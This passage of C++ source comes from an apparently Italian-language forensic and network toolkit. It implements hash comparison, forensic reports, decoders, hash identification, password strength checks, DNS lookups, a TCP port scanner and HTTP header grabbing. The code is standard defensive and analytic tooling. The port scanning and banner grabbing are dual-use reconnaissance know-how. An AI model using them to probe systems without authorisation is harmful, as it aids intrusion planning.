    std::cout << std::string(bars, '#') << Color::DIM << std::string(40-bars,'-')
              << Color::YELLOW << "] " << Color::WHITE << std::fixed << std::setprecision(1) << entropy << "/8\n";

    std::cout << Color::YELLOW << "  Valutazione  : " << color << verdict << Color::RESET << "\n\n";
}

// ─────────────────────────────────────────────
//  CMD: compare — confronto hash di due file
// ─────────────────────────────────────────────
void cmdCompare(const std::vector<std::string>& args) {
    if (args.size() < 3) { std::cout << Color::YELLOW << "Uso: compare <file1> <file2>\n" << Color::RESET; return; }
    auto& f1 = args[1]; auto& f2 = args[2];
    if (!fileExists(f1)) { std::cout << Color::RED << "File non trovato: " << f1 << "\n" << Color::RESET; return; }
    if (!fileExists(f2)) { std::cout << Color::RED << "File non trovato: " << f2 << "\n" << Color::RESET; return; }

    std::string md5a = MD5::hashFile(f1),    md5b = MD5::hashFile(f2);
    std::string sha1  = SHA256::hashFile(f1), sha2  = SHA256::hashFile(f2);

    bool same = (sha1 == sha2);

    std::cout << Color::CYAN << "\n  ⚖️  CONFRONTO FILE\n" << Color::RESET;
    std::cout << Color::DIM << "  " << std::string(65,'-') << "\n" << Color::RESET;
    std::cout << Color::YELLOW << "  File 1: " << Color::WHITE << f1 << "\n";
    std::cout << Color::YELLOW << "  File 2: " << Color::WHITE << f2 << "\n";
    std::cout << Color::DIM << "  " << std::string(65,'-') << "\n" << Color::RESET;
    std::cout << Color::YELLOW << "  MD5 F1 : " << Color::WHITE << md5a << "\n";
    std::cout << Color::YELLOW << "  MD5 F2 : " << Color::WHITE << md5b << "\n";
    std::cout << Color::YELLOW << "  SHA256 F1: " << Color::WHITE << sha1 << "\n";
    std::cout << Color::YELLOW << "  SHA256 F2: " << Color::WHITE << sha2 << "\n";
    std::cout << Color::DIM << "  " << std::string(65,'-') << "\n" << Color::RESET;
    if (same)
        std::cout << Color::BGREEN << "  ✅ I FILE SONO IDENTICI (hash SHA-256 coincidenti)\n" << Color::RESET;
    else
        std::cout << Color::BRED   << "  ❌ I FILE SONO DIVERSI\n" << Color::RESET;
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: report — genera report forense
// ─────────────────────────────────────────────
void cmdReport(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: report <file> [output.txt]\n" << Color::RESET; return; }
    std::string path = args[1];
    std::string outPath = (args.size() >= 3) ? args[2] : "report_forensico.txt";
    if (!fileExists(path)) { std::cout << Color::RED << "File non trovato: " << path << "\n" << Color::RESET; return; }

    struct stat st;
    stat(path.c_str(), &st);
    auto pw  = getpwuid(st.st_uid);
    auto grp = getgrgid(st.st_gid);

    std::ofstream out(outPath);
    if (!out) { std::cout << Color::RED << "Impossibile creare il file di output.\n" << Color::RESET; return; }

    auto now = std::chrono::system_clock::now();
    time_t t = std::chrono::system_clock::to_time_t(now);

    out << "=============================================================\n";
    out << "        REPORT DI ANALISI FORENSE\n";
    out << "=============================================================\n";
    out << "Data analisi   : " << timeStr(t) << "\n";
    out << "Analista       : " << (getenv("USER") ? getenv("USER") : "N/D") << "\n";
    out << "\n--- IDENTIFICAZIONE FILE ---\n";
    out << "Percorso       : " << path << "\n";
    out << "Tipo           : " << detectFileType(path) << "\n";
    out << "Dimensione     : " << st.st_size << " bytes (" << humanSize(st.st_size) << ")\n";
    out << "Permessi       : " << permString(st.st_mode) << "\n";
    out << "Proprietario   : " << (pw  ? pw->pw_name  : std::to_string(st.st_uid)) << "\n";
    out << "Gruppo         : " << (grp ? grp->gr_name : std::to_string(st.st_gid)) << "\n";
    out << "Inode          : " << st.st_ino << "\n";
    out << "\n--- TIMESTAMP ---\n";
    out << "Accesso (atime): " << timeStr(st.st_atime) << "\n";
    out << "Modifica (mtime): " << timeStr(st.st_mtime) << "\n";
    out << "Cambio (ctime) : " << timeStr(st.st_ctime) << "\n";
    out << "\n--- HASH CRITTOGRAFICI ---\n";
    out << "MD5    : " << MD5::hashFile(path) << "\n";
    out << "SHA-256: " << SHA256::hashFile(path) << "\n";

    // Entropia
    std::ifstream f(path, std::ios::binary);
    size_t freq[256]={0}; size_t total=0; char c;
    while(f.get(c)){freq[(uint8_t)c]++;total++;}
    double entropy=0;
    for(int i=0;i<256;i++) if(freq[i]>0){double p=(double)freq[i]/total; entropy-=p*log2(p);}
    out << "\n--- ANALISI STATISTICA ---\n";
    out << "Entropia       : " << std::fixed << std::setprecision(4) << entropy << " bit/byte\n";
    if(entropy>7.5) out << "Valutazione    : ALTA ENTROPIA - possibilmente cifrato/compresso\n";
    else if(entropy>4.0) out << "Valutazione    : Entropia normale\n";
    else out << "Valutazione    : Bassa entropia - dati ridondanti\n";

    // Prime 64 byte in hex
    std::ifstream f2(path, std::ios::binary);
    uint8_t hdr[64]={0}; f2.read((char*)hdr,64);
    size_t nr = f2.gcount();
    out << "\n--- HEADER (primi " << nr << " bytes) ---\n";
    for(size_t i=0;i<nr;i+=16){
        out << std::hex << std::setw(8) << std::setfill('0') << i << "  ";
        for(size_t j=0;j<16&&i+j<nr;j++) out<<std::setw(2)<<(int)hdr[i+j]<<" ";
        out << "  |  ";
        for(size_t j=0;j<16&&i+j<nr;j++) out<<(char)(hdr[i+j]>=32&&hdr[i+j]<=126?hdr[i+j]:'.');
        out << "\n";
    }
    out << std::dec;
    out << "\n=============================================================\n";
    out << "Fine report\n";
    out << "=============================================================\n";
    out.close();

    std::cout << Color::BGREEN << "\n  ✅ Report generato: " << Color::WHITE << outPath << Color::RESET << "\n\n";
}

// ─────────────────────────────────────────────
//  NETWORK HEADERS (POSIX sockets)
// ─────────────────────────────────────────────
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>

// ─────────────────────────────────────────────
//  CMD: decode — Base64 / Hex / URL / ROT13
// ─────────────────────────────────────────────
std::string base64Decode(const std::string& in) {
    const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int val=0, bits=-8;
    for (unsigned char c : in) {
        if (c == '=') break;
        auto pos = chars.find(c);
        if (pos == std::string::npos) continue;
        val = (val << 6) + (int)pos;
        bits += 6;
        if (bits >= 0) { out += (char)((val >> bits) & 0xFF); bits -= 8; }
    }
    return out;
}

std::string base64Encode(const std::string& in) {
    const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out; int val=0, bits=-6;
    for (unsigned char c : in) {
        val = (val << 8) + c; bits += 8;
        while (bits >= 0) { out += chars[(val >> bits) & 0x3F]; bits -= 6; }
    }
    if (bits > -6) out += chars[((val << 8) >> (bits+8)) & 0x3F];
    while (out.size() % 4) out += '=';
    return out;
}

std::string hexDecode(const std::string& in) {
    std::string out;
    for (size_t i=0; i+1<in.size(); i+=2) {
        std::string byte = in.substr(i,2);
        char c = (char)strtol(byte.c_str(), nullptr, 16);
        out += c;
    }
    return out;
}

std::string rot13(const std::string& in) {
    std::string out = in;
    for (char& c : out) {
        if (c>='a'&&c<='z') c = (c-'a'+13)%26+'a';
        else if (c>='A'&&c<='Z') c = (c-'A'+13)%26+'A';
    }
    return out;
}

std::string urlDecode(const std::string& in) {
    std::string out; char c;
    for (size_t i=0;i<in.size();i++) {
        if (in[i]=='%' && i+2<in.size()) {
            std::string hex = in.substr(i+1,2);
            c = (char)strtol(hex.c_str(), nullptr, 16);
            out += c; i += 2;
        } else if (in[i]=='+') { out += ' '; }
        else { out += in[i]; }
    }
    return out;
}

void cmdDecode(const std::vector<std::string>& args) {
    if (args.size() < 3) {
        std::cout << Color::YELLOW << "Uso: decode <tipo> <stringa>\n"
                  << "  Tipi: base64, base64enc, hex, rot13, url\n" << Color::RESET;
        return;
    }
    std::string type = toLower(args[1]);
    // Ricostruisce la stringa con spazi (per input con spazi)
    std::string input;
    for (size_t i=2;i<args.size();i++) { if(i>2) input+=' '; input+=args[i]; }

    std::cout << Color::CYAN << "\n  🔓 DECODE [" << type << "]\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────\n" << Color::RESET;
    std::cout << Color::YELLOW << "  Input  : " << Color::WHITE << input << "\n";

    std::string result;
    if      (type=="base64")    result = base64Decode(input);
    else if (type=="base64enc") result = base64Encode(input);
    else if (type=="hex")       result = hexDecode(input);
    else if (type=="rot13")     result = rot13(input);
    else if (type=="url")       result = urlDecode(input);
    else { std::cout << Color::RED << "  Tipo non riconosciuto.\n" << Color::RESET; return; }

    std::cout << Color::YELLOW << "  Output : " << Color::GREEN << result << Color::RESET << "\n\n";
}

// ─────────────────────────────────────────────
//  CMD: hashid — identifica tipo di hash
// ─────────────────────────────────────────────
void cmdHashId(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: hashid <hash>\n" << Color::RESET; return; }
    std::string h = trim(args[1]);
    size_t len = h.size();

    // Controlla se è esadecimale puro
    bool isHex = std::all_of(h.begin(), h.end(), [](char c){
        return (c>='0'&&c<='9')||(c>='a'&&c<='f')||(c>='A'&&c<='F');
    });

    std::cout << Color::CYAN << "\n  🔑 IDENTIFICAZIONE HASH\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────\n" << Color::RESET;
    std::cout << Color::YELLOW << "  Hash  : " << Color::WHITE << h << "\n";
    std::cout << Color::YELLOW << "  Lungh : " << Color::WHITE << len << " caratteri\n";
    std::cout << Color::YELLOW << "  Hex   : " << Color::WHITE << (isHex?"sì":"no (contiene caratteri non-hex)") << "\n\n";

    std::vector<std::pair<std::string,std::string>> matches;
    if (isHex) {
        if (len==32)  matches.push_back({"MD5",          "128 bit — comune, non sicuro"});
        if (len==40)  matches.push_back({"SHA-1",        "160 bit — deprecato"});
        if (len==56)  matches.push_back({"SHA-224",      "224 bit"});
        if (len==64)  matches.push_back({"SHA-256",      "256 bit — standard moderno"});
        if (len==96)  matches.push_back({"SHA-384",      "384 bit"});
        if (len==128) matches.push_back({"SHA-512",      "512 bit"});
        if (len==32)  matches.push_back({"MD4",          "128 bit — obsoleto"});
        if (len==32)  matches.push_back({"NTLM",         "Windows password hash"});
        if (len==16)  matches.push_back({"LM hash",      "Windows LAN Manager (obsoleto)"});
        if (len==40)  matches.push_back({"MySQL SHA-1",  "MySQL 4.1+ password"});
    }
    // BCrypt
    if (h.size()>=7 && (h.substr(0,4)=="$2a$"||h.substr(0,4)=="$2b$"||h.substr(0,4)=="$2y$"))
        matches.push_back({"BCrypt", "60 char — usato in molti CMS"});
    // MD5 crypt
    if (h.size()>3 && h.substr(0,3)=="$1$")
        matches.push_back({"MD5crypt", "Linux /etc/shadow formato $1$"});
    // SHA-512 crypt
    if (h.size()>3 && h.substr(0,3)=="$6$")
        matches.push_back({"SHA-512crypt", "Linux /etc/shadow formato $6$"});
    // SHA-256 crypt
    if (h.size()>3 && h.substr(0,3)=="$5$")
        matches.push_back({"SHA-256crypt", "Linux /etc/shadow formato $5$"});

    if (matches.empty()) {
        std::cout << Color::RED << "  Nessun tipo di hash riconosciuto.\n" << Color::RESET;
    } else {
        std::cout << Color::YELLOW << "  Possibili corrispondenze:\n";
        for (auto& m : matches)
            std::cout << Color::BGREEN << "    ✓ " << Color::WHITE << std::left << std::setw(16)
                      << m.first << Color::DIM << "  " << m.second << Color::RESET << "\n";
    }
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: passcheck — analisi robustezza password
// ─────────────────────────────────────────────
void cmdPassCheck(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: passcheck <password>\n" << Color::RESET; return; }
    std::string pass = args[1];
    int score = 0;
    std::vector<std::pair<bool,std::string>> checks;

    bool hasLen   = pass.size() >= 12;
    bool hasUpper = std::any_of(pass.begin(),pass.end(),::isupper);
    bool hasLower = std::any_of(pass.begin(),pass.end(),::islower);
    bool hasDigit = std::any_of(pass.begin(),pass.end(),::isdigit);
    bool hasSpec  = std::any_of(pass.begin(),pass.end(),[](char c){return !::isalnum(c);});
    bool noRepeat = true;
    for (size_t i=0;i+2<pass.size();i++)
        if (pass[i]==pass[i+1]&&pass[i+1]==pass[i+2]){noRepeat=false;break;}

    // Parole comuni
    std::vector<std::string> commonParts = {"password","123456","qwerty","admin","login","letmein","welcome","monkey","dragon","master","pass"};
    std::string lpass = toLower(pass);
    bool noCommon = std::none_of(commonParts.begin(),commonParts.end(),[&](const std::string& p){return lpass.find(p)!=std::string::npos;});

    if (hasLen)   { score+=2; checks.push_back({true,  "Lunghezza >= 12 caratteri"}); }
    else          {           checks.push_back({false, "Lunghezza < 12 caratteri (troppo corta)"}); }
    if (hasUpper) { score++;  checks.push_back({true,  "Contiene maiuscole"}); }
    else          {           checks.push_back({false, "Nessuna maiuscola"}); }
    if (hasLower) { score++;  checks.push_back({true,  "Contiene minuscole"}); }
    else          {           checks.push_back({false, "Nessuna minuscola"}); }
    if (hasDigit) { score++;  checks.push_back({true,  "Contiene cifre"}); }
    else          {           checks.push_back({false, "Nessuna cifra"}); }
    if (hasSpec)  { score+=2; checks.push_back({true,  "Contiene caratteri speciali"}); }
    else          {           checks.push_back({false, "Nessun carattere speciale"}); }
    if (noRepeat) { score++;  checks.push_back({true,  "Nessuna ripetizione >=3 caratteri"}); }
    else          {           checks.push_back({false, "Ripetizione di caratteri rilevata"}); }
    if (noCommon) { score++;  checks.push_back({true,  "Nessuna parola comune rilevata"}); }
    else          {           checks.push_back({false, "Contiene parola comune (pericoloso!)"}); }

    std::string verdict, col;
    if      (score >= 8) { verdict = "FORTE";      col = Color::BGREEN; }
    else if (score >= 5) { verdict = "MEDIA";      col = Color::YELLOW; }
    else if (score >= 3) { verdict = "DEBOLE";     col = Color::BRED; }
    else                 { verdict = "CRITICA";    col = Color::BG_RED + Color::BWHITE; }

    std::cout << Color::CYAN << "\n  🔐 ANALISI PASSWORD\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────\n" << Color::RESET;
    for (auto& c : checks)
        std::cout << (c.first ? Color::GREEN+"  ✓ " : Color::RED+"  ✗ ") << Color::WHITE << c.second << Color::RESET << "\n";
    std::cout << Color::DIM << "  ─────────────────────────────────────────\n" << Color::RESET;
    std::cout << Color::YELLOW << "  Score   : " << Color::WHITE << score << "/9\n";
    std::cout << Color::YELLOW << "  Forza   : " << col << " " << verdict << " " << Color::RESET << "\n\n";
}

// ─────────────────────────────────────────────
//  CMD: dns — risoluzione DNS / reverse lookup
// ─────────────────────────────────────────────
void cmdDns(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: dns <hostname|ip>\n" << Color::RESET; return; }
    std::string target = args[1];

    std::cout << Color::CYAN << "\n  🌐 DNS LOOKUP: " << Color::WHITE << target << "\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────\n" << Color::RESET;

    struct addrinfo hints{}, *res = nullptr;
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    int err = getaddrinfo(target.c_str(), nullptr, &hints, &res);
    if (err != 0) {
        std::cout << Color::RED << "  Risoluzione fallita: " << gai_strerror(err) << Color::RESET << "\n\n";
        return;
    }

    std::set<std::string> seen;
    for (auto* p = res; p; p = p->ai_next) {
        char ipstr[INET6_ADDRSTRLEN];
        void* addr;
        std::string family;
        if (p->ai_family == AF_INET) {
            addr   = &((struct sockaddr_in*)p->ai_addr)->sin_addr;
            family = "IPv4";
        } else {
            addr   = &((struct sockaddr_in6*)p->ai_addr)->sin6_addr;
            family = "IPv6";
        }
        inet_ntop(p->ai_family, addr, ipstr, sizeof(ipstr));
        std::string ip(ipstr);
        if (seen.find(ip) == seen.end()) {
            seen.insert(ip);
            std::cout << Color::YELLOW << "  " << std::left << std::setw(6) << family
                      << Color::GREEN << ip << Color::RESET << "\n";
        }
    }

    // Reverse lookup
    if (!res->ai_addr) { freeaddrinfo(res); return; }
    char host[NI_MAXHOST], svc[NI_MAXSERV];
    if (getnameinfo(res->ai_addr, res->ai_addrlen, host, sizeof(host), svc, sizeof(svc), 0) == 0)
        std::cout << Color::YELLOW << "  Reverse : " << Color::WHITE << host << Color::RESET << "\n";

    freeaddrinfo(res);
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: portcheck — verifica se una porta è aperta
// ─────────────────────────────────────────────
void cmdPortCheck(const std::vector<std::string>& args) {
    if (args.size() < 3) { std::cout << Color::YELLOW << "Uso: portcheck <host> <porta1> [porta2 ...]\n" << Color::RESET; return; }
    std::string host = args[1];

    std::cout << Color::CYAN << "\n  🔌 PORT CHECK: " << Color::WHITE << host << "\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────\n" << Color::RESET;

    // Mappa servizi comuni
    std::map<int,std::string> services = {
        {21,"FTP"},{22,"SSH"},{23,"Telnet"},{25,"SMTP"},{53,"DNS"},
        {80,"HTTP"},{110,"POP3"},{143,"IMAP"},{443,"HTTPS"},{445,"SMB"},
        {3306,"MySQL"},{3389,"RDP"},{5432,"PostgreSQL"},{6379,"Redis"},
        {8080,"HTTP-Alt"},{8443,"HTTPS-Alt"},{27017,"MongoDB"}
    };

    for (size_t i=2; i<args.size(); i++) {
        int port = std::stoi(args[i]);
        std::string svcName = services.count(port) ? services[port] : "?";

        struct addrinfo hints{}, *res=nullptr;
        hints.ai_family   = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        std::string portStr = std::to_string(port);
        bool open = false;

        if (getaddrinfo(host.c_str(), portStr.c_str(), &hints, &res)==0) {
            int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
            if (sock >= 0) {
                // Timeout 2s tramite SO_SNDTIMEO
                struct timeval tv{2,0};
                setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
                setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
                open = (connect(sock, res->ai_addr, res->ai_addrlen) == 0);
                close(sock);
            }
            freeaddrinfo(res);
        }

        std::cout << "  " << (open ? Color::BGREEN+"[APERTA] " : Color::RED+"[CHIUSA] ")
                  << Color::WHITE << std::setw(6) << port
                  << Color::DIM  << "  " << svcName << Color::RESET << "\n";
    }
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: portscan — scansione rapida range porte
// ─────────────────────────────────────────────
void cmdPortScan(const std::vector<std::string>& args) {
    if (args.size() < 4) { std::cout << Color::YELLOW << "Uso: portscan <host> <start_port> <end_port>\n" << Color::RESET; return; }
    std::string host = args[1];
    int start = std::stoi(args[2]);
    int end   = std::stoi(args[3]);
    if (end - start > 1000) { std::cout << Color::RED << "  Range max 1000 porte per sessione.\n" << Color::RESET; return; }

    std::map<int,std::string> services = {
        {21,"FTP"},{22,"SSH"},{23,"Telnet"},{25,"SMTP"},{53,"DNS"},
        {80,"HTTP"},{110,"POP3"},{143,"IMAP"},{443,"HTTPS"},{445,"SMB"},
        {3306,"MySQL"},{3389,"RDP"},{5432,"PostgreSQL"},{6379,"Redis"},
        {8080,"HTTP-Alt"},{27017,"MongoDB"}
    };

    std::cout << Color::CYAN << "\n  🔍 PORT SCAN: " << Color::WHITE << host
              << Color::DIM << "  [" << start << "-" << end << "]\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────\n" << Color::RESET;

    int openCount = 0;
    for (int port = start; port <= end; port++) {
        struct addrinfo hints{}, *res=nullptr;
        hints.ai_family   = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        std::string portStr = std::to_string(port);
        bool open = false;
        if (getaddrinfo(host.c_str(), portStr.c_str(), &hints, &res)==0) {
            int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
            if (sock >= 0) {
                struct timeval tv{1,0};
                setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
                setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
                open = (connect(sock, res->ai_addr, res->ai_addrlen) == 0);
                close(sock);
            }
            freeaddrinfo(res);
        }
        if (open) {
            openCount++;
            std::string svc = services.count(port) ? services[port] : "unknown";
            std::cout << Color::BGREEN << "  [APERTA] " << Color::WHITE
                      << std::setw(6) << port << Color::DIM << "  " << svc << Color::RESET << "\n";
        }
    }
    std::cout << Color::YELLOW << "\n  Porte aperte trovate: " << openCount << Color::RESET << "\n\n";
}

// ─────────────────────────────────────────────
//  CMD: httphead — scarica e mostra headers HTTP
// ─────────────────────────────────────────────
void cmdHttpHead(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: httphead <host> [porta] [path]\n" << Color::RESET; return; }
    std::string host = args[1];
    std::string port = (args.size()>=3) ? args[2] : "80";
    std::string path = (args.size()>=4) ? args[3] : "/";

    std::cout << Color::CYAN << "\n  🌍 HTTP HEADERS: " << Color::WHITE << host << ":" << port << path << "\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────\n" << Color::RESET;

    struct addrinfo hints{}, *res=nullptr;
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host.c_str(), port.c_str(), &hints, &res)!=0) {
        std::cout << Color::RED << "  Impossibile risolvere host.\n" << Color::RESET; return;
    }
    int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock < 0) { freeaddrinfo(res); std::cout << Color::RED << "  Socket error.\n" << Color::RESET; return; }
    struct timeval tv{5,0};
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    if (connect(sock, res->ai_addr, res->ai_addrlen)!=0) {
        close(sock); freeaddrinfo(res);
        std::cout << Color::RED << "  Connessione rifiutata.\n" << Color::RESET; return;
    }
    freeaddrinfo(res);

    std::string req = "HEAD " + path + " HTTP/1.0\r\nHost: " + host + "\r\nUser-Agent: NexusForensic/1.0\r\nConnection: close\r\n\r\n";
    send(sock, req.c_str(), req.size(), 0);

    std::string response;
    char buf[4096]; ssize_t n;
    while ((n = recv(sock, buf, sizeof(buf)-1, 0)) > 0) {
        buf[n]='\0'; response += buf;
        if (response.find("\r\n\r\n") != std::string::npos) break;
    }
    close(sock);

    // Parse e stampa headers
    std::istringstream ss(response);
    std::string hline; bool first=true;
    while (std::getline(ss, hline)) {
        hline = trim(hline);
        if (hline.empty()) break;
        if (first) {
            // Status line
            bool ok = hline.find("200")!=std::string::npos;
            bool redir = hline.find("30")!=std::string::npos;
            std::string col = ok ? Color::BGREEN : (redir ? Color::YELLOW : Color::BRED);
            std::cout << col << "  " << hline << Color::RESET << "\n";
            first=false;
        } else {
            auto colon = hline.find(':');
            if (colon != std::string::npos) {
                std::string key = trim(hline.substr(0,colon));
                std::string val = trim(hline.substr(colon+1));
                // Evidenzia header interessanti forensicamente
                bool interesting = (key=="Server"||key=="X-Powered-By"||key=="Set-Cookie"||
                                    key=="X-Frame-Options"||key=="Content-Security-Policy"||
                                    key=="X-Generator"||key=="Via"||key=="X-AspNet-Version");
                std::cout << Color::YELLOW << "  " << std::left << std::setw(30) << key
                          << (interesting?Color::BRED:Color::WHITE) << val << Color::RESET << "\n";
            }
        }
    }
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: binwalk — cerca firme embedded in file
// ─────────────────────────────────────────────
void cmdBinwalk(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: binwalk <file>\n" << Color::RESET; return; }
    std::string path = args[1];
    std::ifstream f(path, std::ios::binary);
    if (!f) { std::cout << Color::RED << "File non trovato: " << path << "\n" << Color::RESET; return; }

    f.seekg(0, std::ios::end);
    size_t fsize = f.tellg();
    f.seekg(0);
    std::vector<uint8_t> data(fsize);
    f.read((char*)data.data(), fsize);

    std::cout << Color::CYAN << "\n  🔭 BINWALK: " << path << Color::DIM << "  (" << humanSize(fsize) << ")\n" << Color::RESET;
    std::cout << Color::DIM << "  Offset      HEX         Descrizione\n";
    std::cout << "  " << std::string(60,'-') << "\n" << Color::RESET;

    int found = 0;
    for (auto& sig : MAGIC_SIGNATURES) {
        for (size_t offset = 0; offset + sig.bytes.size() < fsize; offset++) {
            bool match = true;
            for (size_t j=0; j<sig.bytes.size(); j++) {
                if (data[offset+j] != sig.bytes[j]) { match=false; break; }
            }
            if (match) {
                found++;
                std::cout << Color::GREEN << "  0x" << std::hex << std::setw(8) << std::setfill('0') << offset;
                std::cout << "  ";
                for (size_t j=0; j<std::min(sig.bytes.size(),(size_t)4); j++)
                    std::cout << std::setw(2) << (int)sig.bytes[j] << " ";
                std::cout << std::dec << Color::WHITE << "  " << sig.description << Color::RESET << "\n";
                // Salta in avanti per evitare duplicati ravvicinati
                offset += sig.bytes.size();
            }
        }
    }
    if (found==0) std::cout << Color::DIM << "  Nessuna firma rilevata.\n" << Color::RESET;
    std::cout << Color::YELLOW << "\n  Firme trovate: " << found << Color::RESET << "\n\n";
}

// ─────────────────────────────────────────────
//  CMD: xor — XOR brute/decode su file o stringa
// ─────────────────────────────────────────────
void cmdXor(const std::vector<std::string>& args) {
    if (args.size() < 3) {
        std::cout << Color::YELLOW << "Uso: xor <hex_key> <file>\n"
                  << "     xor brute <file>   (prova chiavi 0x01-0xFF)\n" << Color::RESET;
        return;
    }
    std::string mode = args[1];

    if (mode == "brute") {
        std::string path = args[2];
        std::ifstream f(path, std::ios::binary);
        if (!f) { std::cout << Color::RED << "File non trovato.\n" << Color::RESET; return; }
        std::vector<uint8_t> data;
        char c; while(f.get(c)) data.push_back((uint8_t)c);

        std::cout << Color::CYAN << "\n  🔀 XOR BRUTE FORCE: " << path << "\n" << Color::RESET;
        std::cout << Color::DIM << "  Cercando chiavi con output leggibile...\n" << Color::RESET;
        std::cout << Color::DIM << "  " << std::string(60,'-') << "\n" << Color::RESET;

        for (int key=1; key<256; key++) {
            // Conta caratteri ASCII stampabili dopo XOR
            int readable = 0;
            for (uint8_t b : data) {
                char xd = (char)(b ^ key);
                if (xd>=32&&xd<=126) readable++;
            }
            double ratio = (double)readable/data.size();
            if (ratio > 0.85) {
                std::cout << Color::BGREEN << "  Key 0x" << std::hex << std::setw(2) << std::setfill('0') << key
                          << std::dec << Color::DIM << "  (" << (int)(ratio*100) << "% readable)  " << Color::WHITE;
                // Mostra i primi 60 char
                size_t lim = std::min(data.size(),(size_t)60);
                for (size_t i=0;i<lim;i++) {
                    char xd=(char)(data[i]^key);
                    std::cout << (xd>=32&&xd<=126?xd:'.');
                }
                std::cout << Color::RESET << "\n";
            }
        }
        std::cout << "\n";
    } else {
        // XOR con chiave specifica
        int key = (int)strtol(mode.c_str(), nullptr, 16);
        std::string path = args[2];
        std::ifstream f(path, std::ios::binary);
        if (!f) { std::cout << Color::RED << "File non trovato.\n" << Color::RESET; return; }
        std::vector<uint8_t> data;
        char c; while(f.get(c)) data.push_back((uint8_t)c);

        std::cout << Color::CYAN << "\n  🔀 XOR DECODE [key=0x" << std::hex << key << std::dec << "]\n" << Color::RESET;
        std::cout << Color::DIM << "  " << std::string(60,'-') << "\n" << Color::RESET;
        size_t lim = std::min(data.size(),(size_t)512);
        for (size_t i=0;i<lim;i++) {
            char xd=(char)(data[i]^key);
            std::cout << (xd>=32&&xd<=126?xd:'.');
        }
        std::cout << Color::RESET << "\n\n";
    }
}

// ─────────────────────────────────────────────
//  CMD: whois-like / host info
// ─────────────────────────────────────────────
void cmdHostInfo(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: hostinfo <hostname|ip>\n" << Color::RESET; return; }
    std::string target = args[1];

    std::cout << Color::CYAN << "\n  🖥  HOST INFO: " << Color::WHITE << target << "\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────\n" << Color::RESET;

    // Risolve tutti gli indirizzi
    struct addrinfo hints{}, *res=nullptr;
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(target.c_str(), nullptr, &hints, &res)!=0) {
        std::cout << Color::RED << "  Impossibile risolvere l'host.\n" << Color::RESET << "\n"; return;
    }

    std::cout << Color::YELLOW << "  Indirizzi IP:\n" << Color::RESET;
    std::set<std::string> seen;
    for (auto* p=res; p; p=p->ai_next) {
        char ip[INET6_ADDRSTRLEN];
        void* addr;
        std::string fam;
        if (p->ai_family==AF_INET) { addr=&((struct sockaddr_in*)p->ai_addr)->sin_addr; fam="IPv4"; }
        else { addr=&((struct sockaddr_in6*)p->ai_addr)->sin6_addr; fam="IPv6"; }
        inet_ntop(p->ai_family,addr,ip,sizeof(ip));
        if (!seen.count(ip)) {
            seen.insert(ip);
            std::cout << Color::GREEN << "    " << std::left << std::setw(6) << fam << ip << Color::RESET << "\n";

            // Prova reverse lookup
            char host[NI_MAXHOST];
            if (getnameinfo(p->ai_addr,p->ai_addrlen,host,sizeof(host),nullptr,0,0)==0 && host!=target)
                std::cout << Color::DIM << "    Reverse: " << host << Color::RESET << "\n";
        }
    }

    // Hostname locale
    char myhost[256]; gethostname(myhost,sizeof(myhost));
    std::cout << Color::YELLOW << "\n  Host locale: " << Color::WHITE << myhost << Color::RESET << "\n";

    // Porte comuni aperte
    std::cout << Color::YELLOW << "\n  Scansione porte comuni:\n" << Color::RESET;
    std::vector<std::pair<int,std::string>> common = {
        {21,"FTP"},{22,"SSH"},{23,"Telnet"},{25,"SMTP"},{53,"DNS"},
        {80,"HTTP"},{443,"HTTPS"},{445,"SMB"},{3306,"MySQL"},{3389,"RDP"}
    };
    for (auto& [port,svc] : common) {
        int sock = socket(res->ai_family, SOCK_STREAM, 0);
        if (sock<0) continue;
        struct timeval tv{1,0};
